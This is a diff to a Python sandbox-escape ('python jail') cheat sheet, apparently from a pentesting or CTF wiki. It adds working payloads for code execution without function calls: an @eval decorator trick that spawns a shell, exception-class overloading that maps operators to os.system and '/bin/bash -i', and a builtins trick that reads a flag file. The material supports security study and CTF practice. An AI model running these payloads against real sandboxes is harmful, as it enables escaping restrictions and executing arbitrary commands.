@@ -134,7 +134,17 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 
 ## Python execution without calls
 
-If you are inside a python jail that doesn't allow to make calls, there are still some ways to execute arbitrary functions:
+If you are inside a python jail that **doesn't allow to make calls**, there are still some ways to **execute arbitrary functions, code** and **commands**.
+
+### RCE with @eval
+
+```python
+@eval
+@'__import__("os").system("sh")'.format
+class _:pass
+```
+
+### RCE Declaring exceptions
 
 ```python
 # Declare arbitrary exception class
@@ -143,7 +153,7 @@ class Klecko(Exception):
     return 1
 
 # Change add function
-Klecko.__add__ = os.system
+Klecko.__add__ = os.system #os is already imported
 
 # Generate an object of the class with a try/except + raise
 ## Trick from @_nag0mez
@@ -178,6 +188,17 @@ __irshift__ (k >>= "/bin/bash -i")
 __iand__ (k = "/bin/bash -i")
 __ior__ (k |= "/bin/bash -i")
 __ixor__ (k ^= "/bin/bash -i")
+```
+
+### Read file with builtins help
+
+```python
+__builtins__.__dict__["license"]._Printer__filenames=["flag"]
+a = __builtins__.help
+a.__class__.__enter__ = __builtins__.__dict__["license"]
+a.__class__.__exit__ = lambda self, *args: None
+with (a as b):
+    pass
 ```
 
 ## Builtins
